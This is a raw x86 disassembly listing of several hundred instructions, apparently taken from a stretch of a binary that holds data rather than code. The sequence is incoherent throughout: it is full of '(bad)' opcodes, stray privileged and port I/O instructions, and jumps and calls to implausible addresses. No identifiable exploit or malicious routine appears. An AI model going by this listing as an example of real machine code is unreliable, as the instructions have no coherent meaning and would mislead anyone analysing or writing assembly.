  4094ee:	xchg   BYTE PTR [eax+edx*1+0xce733cc],ch
  4094f5:	pushf  
  4094f6:	xchg   BYTE PTR [si-0x31b0],ch
  4094fb:	out    0xd5,al
  4094fd:	(bad)  
  4094fe:	xor    BYTE PTR [ecx+0x17],dh
  409501:	mov    ds:0xf9c5bb82,al
  409506:	je     0x4094a7
  409508:	fwait
  409509:	push   edi
  40950a:	mov    esi,0xb4eda9cb
  40950f:	push   edx
  409510:	out    0xa6,al
  409512:	cmp    eax,0x6ff6cabf
  409517:	xchg   BYTE PTR [ebx+eax*1],al
  40951a:	push   0x6e43870c
  40951f:	fnstsw WORD PTR [edx-0x1280e033]
  409525:	jns    0x40957b
  409527:	xchg   DWORD PTR [bp+di+0xf],esi
  40952b:	cmp    al,0xce
  40952d:	out    0xd6,al
  40952f:	sub    DWORD PTR [esi+0x5b],eax
  409532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409533:	adc    BYTE PTR [ecx-0x48],dl
  409536:	das    
  409537:	mov    esi,0x82000aa7
  40953c:	xor    BYTE PTR [ebx-0x3f191c40],0xbc
  409543:	push   ebp
  409544:	add    DWORD PTR [ebp-0x6bb3a156],ebx
  40954a:	add    esp,eax
  40954c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40954d:	pop    es
  40954e:	(bad)  
  40954f:	in     al,0x48
  409551:	cmp    ebp,DWORD PTR [edi-0x6cb7d140]
  409557:	add    eax,0xca63c78c
  40955c:	mov    dl,0x5c
  40955e:	data16 sahf 
  409560:	mov    al,0x7f
  409562:	inc    esp
  409563:	in     eax,dx
  409564:	mov    ebp,0x381f923
  409569:	shl    cl,0x78
  40956c:	call   DWORD PTR [ecx-0x20]
  40956f:	rcl    DWORD PTR [esi],cl
  409571:	imul   ebp,DWORD PTR ds:[ebp+0x396365fd],0xd8f8515d
  40957c:	sub    ebx,DWORD PTR [edi]
  40957e:	in     al,dx
  40957f:	jns    0x4095cc
  409581:	hlt    
  409582:	jnp    0x4095c5
  409584:	cmc    
  409585:	lods   eax,DWORD PTR ds:[esi]
  409586:	icebp  
  409587:	mov    eax,ds:0x7d26e91e
  40958c:	or     al,0x8d
  40958e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958f:	sub    al,0xb
  409591:	mov    dl,0xb9
  409593:	jae    0x409573
  409595:	cmp    DWORD PTR [ebp-0x7913c6f1],eax
  40959b:	mov    ds:0x928a2928,al
  4095a0:	push   edx
  4095a1:	fwait
  4095a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095a3:	jmp    0xde3fac3e
  4095a8:	cmc    
  4095a9:	(bad)  
  4095ab:	ss ret 0x925a
  4095af:	mov    BYTE PTR [eax+eiz*4+0x52],0x4a
  4095b4:	push   cs
  4095b5:	mov    BYTE PTR [edi],0xec
  4095b8:	pop    ds
  4095b9:	pop    edx
  4095ba:	sub    al,0xa
  4095bc:	jmp    0x71195ae
  4095c1:	add    DWORD PTR [ebx+0x54ad0051],0x32
  4095c8:	call   0x946a274
  4095cd:	in     eax,dx
  4095ce:	mov    dh,0xe4
  4095d0:	jo     0x409578
  4095d2:	pop    ecx
  4095d3:	out    dx,al
  4095d4:	lea    ebx,[ebx]
  4095d6:	imul   eax,ecx,0x7d5e1db1
  4095dc:	scas   eax,DWORD PTR es:[edi]
  4095dd:	jbe    0x4095b5
  4095df:	call   0x73a2f35c
  4095e4:	daa    
  4095e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095e6:	hlt    
  4095e7:	dec    ebp
  4095e8:	mov    dh,0x10
  4095ea:	cmp    DWORD PTR [ecx],ecx
  4095ec:	xchg   edi,eax
  4095ed:	mov    ds,WORD PTR [ebp-0x3b]
  4095f0:	add    ah,BYTE PTR [edx+0xa986d7b]
  4095f6:	(bad)  
  4095f7:	cmp    edi,DWORD PTR [eax+0xf9c2f2]
  4095fd:	mov    dl,0x82
  4095ff:	retf   0x69e1
  409602:	xor    al,0x18
  409604:	jmp    0xd2173bf3
  409609:	inc    ebp
  40960a:	fcom   DWORD PTR [ebx]
  40960c:	mov    esi,0x3719f3e4
  409611:	scas   al,BYTE PTR es:[edi]
  409612:	jl     0x4095b3
  409614:	xchg   ebx,eax
  409615:	pop    ebx
  409616:	sub    BYTE PTR [ebp+0x34a5adcd],0xdf
  40961d:	push   ebp
  40961e:	mov    eax,ds:0x55d750be
  409623:	popf   
  409624:	fcmovnb st,st(5)
  409626:	inc    esp
  409627:	call   0x1326:0x4cdbdbdb
  40962e:	(bad)  
  40962f:	call   0xaea175df
  409634:	cmp    edi,DWORD PTR [esi+esi*8]
  409637:	fdivr  st,st(3)
  409639:	sbb    BYTE PTR [ebp-0x63],ch
  40963c:	fs mov ah,0x79
  40963f:	add    ah,BYTE PTR [ebp+0x44fdfad2]
  409645:	xor    eax,0x4c4ad550
  40964a:	test   DWORD PTR ds:0xa3d9114b,0xc5daccaa
  409654:	nop
  409655:	loopne 0x4096b1
  409657:	push   ds
  409658:	add    BYTE PTR [esi],0x61
  40965b:	or     bl,dl
  40965d:	mov    DWORD PTR [esi+0x2c],esi
  409660:	mov    eax,ds:0x39e12681
  409665:	xchg   esp,eax
  409666:	push   edx
  409667:	push   ebp
  409668:	adc    dl,al
  40966a:	or     al,BYTE PTR [eax]
  40966c:	cmp    BYTE PTR [esi+edi*4-0x15],bl
  409670:	ja     0x4096a0
  409672:	out    dx,eax
  409673:	sub    al,BYTE PTR [eax]
  409675:	in     al,dx
  409676:	out    dx,eax
  409677:	out    dx,eax
  409678:	jbe    0x4095ff
  40967a:	adc    BYTE PTR [edi+0x8],cl
  40967d:	sar    DWORD PTR [ebx-0x53],0xe5
  409681:	push   ecx
  409682:	add    DWORD PTR [edi-0x6d0325d0],ebx
  409688:	(bad)
  40968b:	sub    ch,BYTE PTR [edi+0x63]
  40968e:	inc    edi
  40968f:	pop    esi
  409690:	add    al,0x0
  409692:	jne    0x4096f4
  409694:	add    dl,ah
  409696:	adc    BYTE PTR [eax-0x7f0d4cf4],dl
  40969c:	shl    DWORD PTR ds:0xeb44bcf9,1
  4096a2:	add    ah,BYTE PTR [ebx-0x74]
  4096a5:	ja     0x4096f9
  4096a7:	imul   ebx,DWORD PTR [edi-0x5a2e594b],0x42f5ff76
  4096b1:	jmp    0x95996f0d
  4096b6:	sbb    BYTE PTR [ebx+0x30],ah
  4096b9:	pop    edx
  4096ba:	mov    ds:0xa77692cb,eax
  4096bf:	push   ebx
  4096c0:	jae    0x409702
  4096c2:	test   eax,0xd6fb7144
  4096c7:	push   ds
  4096c8:	sti    
  4096c9:	jnp    0x409695
  4096cb:	(bad)  
  4096cc:	inc    BYTE PTR [ebp-0x3f16b705]
  4096d2:	ret    
  4096d3:	sub    al,0x5a
  4096d5:	xchg   edi,eax
  4096d6:	dec    edx
  4096d7:	and    al,0xbd
  4096d9:	pop    esi
  4096da:	ret    0xd868
  4096dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096de:	(bad)  
  4096e0:	fstp   DWORD PTR [edi]
  4096e2:	xchg   edi,eax
  4096e3:	into   
  4096e4:	sbb    DWORD PTR [eax-0x3dc0f3ec],edi
  4096ea:	mov    dl,0x8c
  4096ec:	popf   
  4096ed:	xor    DWORD PTR ds:0xb68d809f,0xacf55235
  4096f7:	aas    
  4096f8:	push   edi
  4096f9:	fcom   QWORD PTR [edx+0x4089302b]
  4096ff:	mov    eax,ds:0xa6a01ec6
  409704:	in     al,0xab
  409706:	int3   
  409707:	or     eax,0xba6a861
  40970c:	repz mov esi,0x450c6d00
  409712:	sub    ecx,ecx
  409714:	jb     0x4096e1
  409716:	sub    al,0xb
  409718:	and    eax,DWORD PTR [ebx]
  40971a:	sub    eax,0x860477b9
  40971f:	ss sub al,0x1a
  409722:	pop    eax
  409723:	push   ebx
  409724:	mov    cl,0x2
  409726:	jmp    0x40979a
  409728:	cld    
  409729:	das    
  40972a:	mov    esp,0x36a73cf1
  40972f:	addr16 pushf 
  409731:	fcomp  st(1)
  409733:	lods   al,BYTE PTR ds:[esi]
  409734:	int    0xe8
  409736:	adc    esp,DWORD PTR [ecx+ecx*1+0x10677104]
  40973d:	shl    DWORD PTR [ebp+0x6b],cl
  409740:	sub    eax,0xeb9ba1c3
  409745:	out    dx,eax
  409746:	dec    edi
  409747:	sahf   
  409748:	stc    
  409749:	xor    ebp,DWORD PTR [esi-0x14]
  40974c:	push   ss
  40974d:	cmp    al,0xf2
  40974f:	ficomp WORD PTR [edi+0x14eb7364]
  409755:	pop    ebx
  409756:	pop    ebx
  409757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409758:	push   0xa295bbb5
  40975d:	scas   al,BYTE PTR es:[edi]
  40975e:	lods   al,BYTE PTR ds:[esi]
  40975f:	out    dx,al
  409760:	push   0x6b48d373
  409765:	mov    esi,0xe32838a2
  40976a:	scas   al,BYTE PTR es:[edi]
  40976b:	mov    ebp,0x663a0060
  409770:	add    dh,bl
  409772:	or     al,0x30
  409774:	cmp    ah,bl
  409776:	(bad)  
  409777:	into   
  409778:	nop
  409779:	and    al,0x4d
  40977b:	sub    edx,ecx
  40977d:	ins    BYTE PTR es:[edi],dx
  40977e:	leave  
  40977f:	add    al,0x8
  409781:	mov    DWORD PTR [eax-0x33],eax
  409784:	add    DWORD PTR [esi-0x2f],ecx
  409787:	retf   
  409788:	stc    
  409789:	shl    DWORD PTR [edi],1
  40978b:	add    esi,esi
  40978d:	div    DWORD PTR [edi+0x15]
  409790:	jo     0x40979c
  409792:	clc    
  409793:	add    eax,0x3e5893e0
  409798:	lods   eax,DWORD PTR gs:[esi]
  40979a:	jge    0x409768
  40979c:	pop    eax
  40979d:	(bad)  [edx-0x32]
  4097a0:	mov    ecx,0x888776c8
  4097a5:	loop   0x4097ee
  4097a7:	and    DWORD PTR [ebx-0x4bf05138],edi
  4097ad:	ds dec ecx
  4097af:	push   edx
  4097b0:	push   esp
  4097b1:	xchg   edx,eax
  4097b2:	add    dh,cl
  4097b4:	add    DWORD PTR [edi-0x669ae699],edx
  4097ba:	das    
  4097bb:	retf   0x6f1b
  4097be:	jecxz  0x409757
  4097c0:	xchg   BYTE PTR [edi+ebp*1],bh
  4097c3:	enter  0x128b,0x1d
  4097c7:	inc    edx
  4097c8:	jg     0x4097c8
  4097ca:	ins    DWORD PTR es:[edi],dx
  4097cb:	mov    ebx,0x8fa75446
  4097d0:	int    0x91
  4097d2:	pop    eax
  4097d3:	mov    al,0x50
  4097d5:	cdq    
  4097d6:	cmp    al,0xcf
  4097d8:	sub    DWORD PTR [edx-0x2bdd4afe],ecx
  4097de:	je     0x4097c5
  4097e0:	jmp    0x614:0x6dc7f64d
  4097e7:	add    eax,0x6f784a24
  4097ec:	ja     0x4097b6
  4097ee:	sub    eax,0x67026cf0
  4097f3:	push   es
  4097f4:	ins    BYTE PTR es:[edi],dx
  4097f5:	push   cs
  4097f6:	pop    ebp
  4097f7:	(bad)  
  4097f8:	shr    BYTE PTR [ebp-0x64a5e625],1
  4097fe:	test   edx,ebp
  409800:	das    
  409801:	sub    DWORD PTR [ebp-0x2c],esi
  409804:	jecxz  0x409810
  409806:	scas   eax,DWORD PTR es:[edi]
  409807:	ins    BYTE PTR es:[edi],dx
  409808:	mov    ch,0x9c
  40980a:	add    eax,0xb016220c
  409810:	fs iret 
  409812:	(bad)  
  409813:	or     DWORD PTR [ecx+edx*8],edi
  409816:	xchg   esp,eax
  409817:	loope  0x40982e
  409819:	fwait
  40981a:	push   0xce891686
  40981f:	pop    ss
  409820:	add    eax,DWORD PTR [edi+edi*4+0x4113259d]
  409827:	js     0x409835
  409829:	jo     0x40981c
  40982b:	(bad)  
  40982c:	mov    esp,0x9873cc30
  409831:	into   
  409832:	or     eax,0xe7cc39f3
  409837:	xchg   edx,eax
  409838:	mov    esp,0x29402c70
  40983d:	push   edi
  40983e:	dec    esi
  40983f:	test   BYTE PTR [ecx],bl
  409841:	xor    DWORD PTR [ebx+0x73fa0e4a],esp
  409847:	cmc    
  409848:	shr    BYTE PTR [ebx-0x3b1f23dc],cl
  40984e:	into   
  40984f:	fldcw  WORD PTR [edx+0x7d6937f1]
  409855:	in     al,dx
  409856:	and    BYTE PTR [ebx+0x4e],ch
  409859:	xchg   ebp,eax
  40985a:	adc    eax,0x3060f903
  40985f:	mov    al,ds:0xd5f0e9d3
  409864:	scas   eax,DWORD PTR es:[edi]
  409865:	cmp    eax,0x6fe7abc7
  40986a:	repz shl BYTE PTR [ebx],0x1f
  40986e:	fs imul edi,ebx,0xc
  409872:	mov    ds:0x1da453ed,eax
  409877:	mov    bh,0xe8
  409879:	addr16 jne 0x4098d8
  40987c:	clc    
  40987d:	shl    DWORD PTR [edx+eax*2],cl
  409880:	sub    eax,DWORD PTR [esi+eax*4+0x72]
  409884:	mov    edx,DWORD PTR [ecx+edx*4-0x26]
  409888:	cmp    DWORD PTR [edx-0x2c298cb],eax
  40988e:	scas   eax,DWORD PTR es:[edi]
  40988f:	inc    esi
  409890:	add    BYTE PTR [edx-0x6],bh
  409893:	pop    edi
  409894:	adc    al,0x90
  409896:	cwde   
  409897:	or     DWORD PTR [ebx+0x1e3bcb5e],eax
  40989d:	pop    ss
  40989e:	int3   
  40989f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098a0:	stc    
  4098a1:	jl     0x409836
  4098a3:	leave  
  4098a4:	fs push ebp
  4098a6:	js     0x4098db
  4098a8:	pop    es
  4098a9:	out    dx,al
  4098aa:	fld    TBYTE PTR [edx+0x40]
  4098ad:	mov    cl,0xbc
  4098af:	arpl   WORD PTR [eax],ax
  4098b1:	sbb    BYTE PTR [edi-0xd29a509],cl
  4098b7:	pop    ecx
  4098b8:	pushf  
  4098b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ba:	(bad)  
  4098bb:	jecxz  0x4098d3
  4098bd:	ds push 0x2f061dad
  4098c3:	cmp    eax,0xc671422c
  4098c8:	sbb    bh,dh
  4098ca:	loop   0x40986f
  4098cc:	sahf   
  4098cd:	fidivr WORD PTR [ecx]
  4098cf:	dec    esi
  4098d0:	mov    WORD PTR [ebx],gs
  4098d2:	arpl   WORD PTR [edi],dx
  4098d4:	mov    ah,0xbe
  4098d6:	xchg   ebp,eax
  4098d7:	mov    dh,0xdd
  4098d9:	inc    edx
  4098da:	sbb    al,0xde
  4098dc:	jmp    0x7c8f3617
  4098e1:	mov    dh,cl
  4098e3:	push   esp
  4098e4:	pushf  
  4098e5:	rcr    BYTE PTR [eax+0x4b],cl
  4098e8:	pop    ecx
  4098e9:	xchg   esp,eax
  4098ea:	fs pop ecx
  4098ec:	dec    esi
  4098ed:	mov    eax,ds:0xa1649fb5
  4098f2:	fisubr WORD PTR [eax]
  4098f4:	bound  ebp,QWORD PTR [edx+0x7f]
  4098f7:	dec    edi
  4098f8:	bound  ebx,QWORD PTR [ebp-0x12]
  4098fb:	jg     0x40990f
  4098fd:	das    
  4098fe:	jp     0x40991f
  409900:	sub    DWORD PTR [ebx+0x26f9a65b],ecx
  409906:	pop    ecx
  409907:	rol    DWORD PTR [esi],1
  409909:	popa   
  40990a:	push   ecx
  40990b:	ret    0xa4a2
  40990e:	inc    ebp
  40990f:	dec    edx
  409910:	add    ebp,0xffffffd4
  409913:	pushf  
  409914:	nop
  409915:	add    BYTE PTR [edx],ch
  409917:	adc    DWORD PTR [edx+edi*1+0x9],esi
  40991b:	cmp    DWORD PTR [esi+0x42],0xffffffab
  40991f:	and    eax,0x81c6e799
  409924:	push   ebx
  409925:	(bad)  
  409926:	(bad)  
  409927:	aaa    
  409928:	add    DWORD PTR [eax-0x3a95413b],eax
  40992e:	loope  0x409985
  409930:	arpl   WORD PTR [ebx],ax
  409932:	les    ecx,FWORD PTR [edx]
  409934:	add    BYTE PTR [eax-0xb],ah
  409937:	mov    dh,0xda
  409939:	xor    eax,0xa26336fc
  40993e:	popa   
  40993f:	jnp    0x4098ce
  409941:	jb     0x4098c4
  409943:	inc    edx
  409945:	add    ah,BYTE PTR [eax]
  409947:	inc    esp
  409948:	add    BYTE PTR fs:[esp+ecx*4+0xd561d40],0x76
  409951:	add    DWORD PTR [edx-0x2d35fd4e],0x52
  409958:	push   0x41
  40995a:	loop   0x409903
  40995c:	or     DWORD PTR [esi-0x1c2b4fba],edx
  409962:	or     bl,al
  409964:	mov    ebx,0xcb8a0975
  409969:	mov    esp,0xc4b3f1ef
  40996e:	dec    ecx
  40996f:	cmp    ebp,DWORD PTR [esi+0x58efdcfa]
  409975:	jmp    0xfdca1edd
  40997a:	add    al,0xc1
  40997c:	sbb    ecx,DWORD PTR fs:[ebp-0x641c83ba]
  409983:	das    
  409984:	lock popf 
  409986:	xchg   edi,eax
  409987:	cs jno 0x40997c
  40998a:	in     al,dx
  40998b:	adc    ebx,DWORD PTR [eax+edi*1-0x2464ff0b]
  409992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409993:	call   0x7d81210e
  409998:	mov    esi,ebp
  40999a:	mov    al,ds:0x5afbcdb4
  40999f:	aad    0x4e
  4099a1:	mov    ah,0x6d
  4099a3:	adc    al,0xf3
  4099a5:	aas    
  4099a6:	bound  eax,QWORD PTR [edi]
  4099a8:	addr16 jo 0x4099ad
  4099ab:	xchg   cl,cl
  4099ad:	inc    ecx
  4099ae:	loop   0x409a15
  4099b0:	retf   
  4099b1:	mov    ch,0x81
  4099b3:	cs push ebx
  4099b5:	and    al,0xab
  4099b7:	xchg   DWORD PTR [eax],eax
  4099b9:	xchg   DWORD PTR [edi+0x2a],esp
  4099bc:	retf   
  4099bd:	xchg   edx,eax
  4099be:	add    DWORD PTR [ebx-0x581faa7d],0xffffff81
  4099c5:	icebp  
  4099c6:	repnz popf 
  4099c8:	mov    ebp,0xdb7973
  4099cd:	push   eax
  4099ce:	adc    al,0xf9
  4099d0:	xchg   esi,esp
  4099d2:	repz (bad) 
  4099d5:	add    eax,0x9295d7f1
  4099da:	pop    ds
  4099db:	dec    esi
  4099dc:	xchg   esp,eax
  4099dd:	jb     0x4099f2
  4099df:	sbb    eax,0x3274c35a
  4099e4:	mov    eax,ds:0x6706ded0
  4099e9:	xor    DWORD PTR [esi+ecx*8+0x1b],0xa804c44f
  4099f1:	fisub  DWORD PTR [ebx-0x4766f5ae]
  4099f7:	popa   
  4099f8:	cdq    
  4099f9:	push   ss
  4099fa:	sub    bl,cl
  4099fc:	or     cl,0xf4
  4099ff:	shr    BYTE PTR [ebp+0x460d6ab8],1
  409a05:	fwait
  409a06:	or     dl,BYTE PTR [eax-0xe]
  409a09:	mov    ds:0xf272cf24,al
  409a0e:	rcr    cl,cl
  409a10:	hlt    
  409a11:	mov    eax,ds:0xbfb39b42
  409a16:	fmul   QWORD PTR [ebx+0x2f6b6384]
  409a1c:	lds    ebx,FWORD PTR [edx-0x36]
  409a1f:	loopne 0x409a21
  409a21:	pop    esp
  409a22:	sbb    bh,dh
  409a24:	outs   dx,BYTE PTR ds:[esi]
  409a25:	sbb    BYTE PTR [eax-0x4b43a3cb],dh
  409a2b:	mov    edx,esi
  409a2d:	ins    DWORD PTR es:[edi],dx
  409a2e:	pop    edx
  409a2f:	ins    DWORD PTR es:[edi],dx
  409a30:	out    0xfc,eax
  409a32:	xchg   ebx,eax
  409a33:	dec    edx
  409a34:	loop   0x409a39
  409a36:	add    BYTE PTR [eax],bl
  409a38:	stos   DWORD PTR es:[edi],eax
  409a39:	std    
  409a3a:	jae    0x409a85
  409a3c:	rcr    BYTE PTR [ecx+0x64b69d05],0x63
  409a43:	nop
  409a44:	shr    ch,cl
  409a46:	sub    ah,BYTE PTR [esi-0x2b6598cd]
  409a4c:	pop    ecx
  409a4d:	ror    BYTE PTR [edx+0x3e57b5b5],0x46
  409a54:	fsubr  st(3),st
  409a56:	inc    edi
  409a57:	cs in  al,dx
  409a59:	push   ebp
  409a5a:	sub    al,0x20
  409a5c:	out    0xd9,al
  409a5e:	push   ebp
  409a5f:	cmp    al,0x1f
  409a61:	push   ss
  409a62:	cdq    
  409a63:	or     DWORD PTR [ebp+0x2df35fd6],0x889702ac
  409a6d:	pop    ecx
  409a6e:	clc    
  409a6f:	in     eax,dx
  409a70:	(bad)  
  409a71:	jp     0x409a02
  409a73:	ja     0x409ad6
  409a75:	cmp    eax,0x85149013
  409a7a:	dec    ebx
  409a7b:	or     edx,esi
  409a7d:	(bad)  
  409a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a7f:	push   ebx
  409a80:	dec    ebx
  409a81:	mov    ecx,0x6407fc22
  409a86:	mov    bl,0x9
  409a88:	mov    bh,0xae
  409a8a:	jge    0x409a23
  409a8c:	daa    
  409a8d:	pop    ds
  409a8e:	jmp    0x409a61
  409a90:	push   0xffffffb5
  409a92:	enter  0xacb2,0x9a
  409a96:	enter  0x7833,0xf2
  409a9a:	jecxz  0x409a7a
  409a9c:	ds mov esp,0x102a38df
  409aa2:	ficom  WORD PTR [edi-0x66]
  409aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa6:	mov    WORD PTR [esi+0x23],es
  409aa9:	pop    esi
  409aaa:	cli    
  409aab:	(bad)  
  409aac:	stos   DWORD PTR es:[edi],eax
  409aad:	jl     0x409a9c
  409aaf:	mov    ecx,0xf5b1b3ef
  409ab4:	adc    BYTE PTR [edi],ah
  409ab6:	dec    edi
  409ab7:	cmp    eax,0x69f6d6c4
  409abc:	push   es
  409abd:	sbb    ebx,DWORD PTR [ebx-0x80]
  409ac0:	je     0x409a4c
  409ac2:	fst    DWORD PTR [esi+esi*8+0x66]
  409ac6:	cmc    
  409ac7:	(bad)  
  409ac8:	aad    0xb5
  409aca:	mov    edx,0x22fabf6
  409acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ad0:	xchg   ebp,eax
  409ad1:	mov    cl,0x18
  409ad3:	jecxz  0x409a8b
  409ad5:	push   ebp
  409ad6:	data16 or BYTE PTR ds:0xba5b934b,0x69
  409ade:	rol    esi,0x46
  409ae1:	scas   eax,DWORD PTR es:[edi]
  409ae2:	mov    dl,0xff
  409ae4:	push   edi
  409ae5:	or     eax,0xd6d6b607
  409aea:	out    0x35,al
  409aec:	mov    edx,ds
  409aee:	jb     0x409ab9
  409af0:	(bad)
  409af4:	hlt    
  409af5:	dec    edi
  409af6:	push   esp
  409af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409af9:	aas    
  409afa:	(bad)  
  409afb:	icebp  
  409afc:	(bad)  
  409afd:	dec    edi
  409aff:	(bad)  
  409b00:	call   0xc0249824
  409b05:	xor    bl,BYTE PTR [ebp+0x1ee0bb4e]
  409b0b:	pusha  
  409b0c:	xor    BYTE PTR [eax],bl
  409b0e:	jo     0x409b0a
  409b10:	hlt    
  409b11:	imul   ebx,esi,0xf9c7defb
  409b17:	hlt    
  409b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b19:	push   DWORD PTR [edx]
  409b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b1c:	dec    esi
  409b1d:	popf   
  409b1e:	and    al,0xcb
  409b20:	xor    cl,BYTE PTR [esi]
  409b22:	div    BYTE PTR [esi+0x29]
  409b25:	retf   0xeab2
  409b28:	stc    
  409b29:	shr    DWORD PTR [ecx],0x7b
  409b2c:	xchg   edx,eax
  409b2d:	mov    dh,0x5c
  409b2f:	adc    cl,BYTE PTR [esi]
  409b31:	cs mov cl,0x46
  409b34:	jmp    0x409ac8
  409b36:	and    cl,bl
  409b38:	cwde   
  409b39:	xchg   ebp,eax
  409b3a:	push   ebx
  409b3b:	mov    ecx,ss
  409b3d:	ds cmp al,0xe7
  409b40:	(bad)  
  409b41:	iretw  
  409b43:	repnz cmp BYTE PTR [edi+ecx*8],0x31
  409b48:	(bad)  
  409b49:	iret   
  409b4a:	dec    ebx
  409b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b4c:	retf   
  409b4d:	or     cl,ch
  409b4f:	fwait
  409b50:	push   ds
  409b51:	jecxz  0x409af6
  409b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b54:	test   eax,0xb850abe8
  409b59:	sub    cl,BYTE PTR [ebx]
  409b5b:	dec    esp
  409b5c:	addr16 mov bl,0x25
  409b5f:	inc    edi
  409b60:	mov    WORD PTR [edx+eax*4+0x74b9ccb2],ss
  409b67:	jns    0x409b73
  409b69:	ins    BYTE PTR es:[edi],dx
  409b6a:	and    ah,BYTE PTR [ebp-0x3dac0135]
  409b70:	(bad)  
  409b71:	in     al,dx
  409b72:	stos   BYTE PTR es:[edi],al
  409b73:	jl     0x409b8c
  409b75:	pop    esi
  409b76:	jns    0x409be8
  409b78:	dec    esi
  409b79:	int3   
  409b7a:	xor    al,0x15
  409b7c:	ins    BYTE PTR es:[edi],dx
  409b7d:	or     al,0x24
  409b7f:	fwait
  409b80:	inc    ebx
  409b81:	leave  
  409b82:	je     0x409b6e
  409b84:	out    dx,al
  409b85:	pop    edi
  409b86:	imul   ecx,DWORD PTR [ebx],0x22
  409b89:	icebp  
  409b8a:	lea    ebp,[esi]
  409b8c:	sub    BYTE PTR [esp+ebx*8-0x6],bh
  409b90:	mov    esp,0xcb40d9f2
  409b95:	xor    eax,0xab00f5b5
  409b9a:	adc    eax,0xf5bd1a38
  409b9f:	push   edx
  409ba0:	test   al,0x2f
  409ba2:	into   
  409ba3:	or     al,0x8c
  409ba5:	dec    ebp
  409ba6:	push   cs
  409ba7:	jg     0x409b87
  409ba9:	sbb    cl,BYTE PTR [ebx]
  409bab:	mov    ch,cl
  409bad:	xchg   DWORD PTR [eax-0x22],esi
  409bb0:	nop
  409bb1:	fs in  al,0xbf
  409bb4:	xchg   DWORD PTR [ebx-0x4e],edi
  409bb7:	push   cs
  409bb8:	or     al,0xb5
  409bba:	push   esi
  409bbb:	outs   dx,BYTE PTR ds:[esi]
  409bbc:	or     eax,0x9d30ccbc
  409bc1:	pop    ebx
  409bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc3:	cdq    
  409bc4:	and    ebx,ecx
  409bc6:	and    al,0xb9
  409bc8:	syscall 
  409bca:	or     ch,BYTE PTR [edx+edx*2]
  409bcd:	add    BYTE PTR [eax+0x54],0x69
  409bd1:	push   es
  409bd2:	(bad)  
  409bd3:	push   0x6e
  409bd5:	pop    esp
  409bd6:	stc    
  409bd7:	push   ds
  409bd8:	setg   BYTE PTR [ebp-0x4f]
  409bdc:	mov    cl,0xd1
  409bde:	scas   eax,DWORD PTR es:[edi]
  409bdf:	test   al,0x7f
  409be1:	push   eax
  409be2:	clc    
  409be3:	mov    eax,0x7e958fc7
  409be8:	push   ebp
  409be9:	mov    eax,0xd6c5294f
  409bee:	(bad)  
  409bef:	push   ss
  409bf0:	pop    ss
  409bf1:	das    
  409bf2:	pop    esi
  409bf3:	out    0xcb,al
  409bf5:	pop    edi
  409bf6:	jge    0x409b96
  409bf8:	mov    ah,0x7b
  409bfa:	mov    dl,bl
  409bfc:	addr16 ffreep st(3)
  409bff:	(bad)  
  409c00:	into   
  409c01:	sbb    DWORD PTR [edx-0x3],edi
  409c04:	sub    eax,0x50e855ac
  409c09:	add    ecx,DWORD PTR ds:0x2834bf8a
  409c0f:	sub    DWORD PTR [eax-0x5],edx
  409c12:	push   ebp
  409c13:	int    0xa2
  409c15:	inc    ecx
  409c16:	bound  eax,QWORD PTR [edx-0x71]
  409c19:	pop    edi
  409c1a:	mov    ecx,0x7363c02
  409c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c20:	pop    edi
  409c21:	call   DWORD PTR gs:[edi-0x588fe792]
  409c28:	scas   eax,DWORD PTR es:[edi]
  409c29:	sbb    DWORD PTR [esi-0x22baeb7a],ecx
  409c2f:	adc    DWORD PTR [bp+di],ebp
  409c32:	jnp    0x409c85
  409c34:	adc    al,0x47
  409c36:	lods   eax,DWORD PTR ds:[esi]
  409c37:	add    eax,0xa3f0af0
  409c3c:	dec    esi
  409c3d:	ror    BYTE PTR [edi-0x405c0b82],0xa8
  409c44:	mov    ch,0xfe
  409c46:	ja     0x409ca7
  409c48:	cld    
  409c49:	loop   0x409c62
  409c4b:	(bad)  [ecx+0x31]
  409c4e:	adc    DWORD PTR [esi-0x55],0xffffffc5
  409c52:	addr16 aas 
  409c54:	sti    
  409c55:	pop    ecx
  409c56:	scas   al,BYTE PTR es:[edi]
  409c57:	pop    ebp
  409c58:	mov    ebx,0xf0be17c6
  409c5d:	add    eax,0xebfc1084
  409c62:	jg     0x409c61
  409c64:	outs   dx,DWORD PTR ds:[esi]
  409c65:	clc    
  409c66:	int3   
  409c67:	addr16 ds ret 
  409c6a:	(bad)  
  409c6c:	sti    
  409c6d:	jg     0x409c0e
  409c6f:	jae    0x409c58
  409c71:	into   
  409c72:	jno    0x409c67
  409c74:	(bad)  
  409c75:	xor    eax,0xdab4d68c
  409c7a:	sbb    eax,0xb792e537
  409c7f:	in     eax,0xb3
  409c81:	stc    
  409c82:	mov    WORD PTR [ebx+ecx*8],?
  409c85:	mov    esp,0x766c1009
  409c8a:	inc    ebx
  409c8b:	test   eax,0x4679f30d
  409c90:	xchg   esi,eax
  409c91:	gs cs and edi,eax
  409c95:	fwait
  409c96:	adc    eax,DWORD PTR [edx+0x50]
  409c99:	imul   eax,DWORD PTR [eax],0x77
  409c9c:	xchg   edx,eax
  409c9d:	jnp    0x409cf0
  409c9f:	hlt    
  409ca0:	push   ebp
  409ca1:	add    DWORD PTR gs:[eax+esi*2-0x6db6bf37],edx
  409ca9:	push   esp
